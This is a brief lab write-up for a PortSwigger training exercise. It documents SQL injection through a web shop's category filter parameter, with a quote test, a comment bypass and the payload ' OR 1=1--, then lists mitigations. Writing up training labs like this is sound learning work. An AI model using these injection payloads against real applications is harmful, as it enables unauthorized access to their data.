# SQL Injection – Product Category Filter Bypass

# Vulnerability Overview
The application is vulnerable to SQL Injection in the category parameter, allowing manipulation of backend queries.

# Steps to Reproduce

**Lab Link** >>  https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

# Navigate to:
* /filter?category=Gifts

# Test input with single quote
* category=Gifts'
→ Results in SQL error (confirms injection point)

# Bypass query using comment
* category=Gifts'--

# Exploit using logical condition
* category=Gifts' OR 1=1--

# Payload Used
'+or+1=1--

# Impact
Attacker can bypass filtering conditions and retrieve all products, potentially exposing sensitive data.

# Tools Used
* Burp Suite (Proxy)
* Browser

# Mitigation
* Use parameterized queries
* Implement input validation
* Apply prepared statements
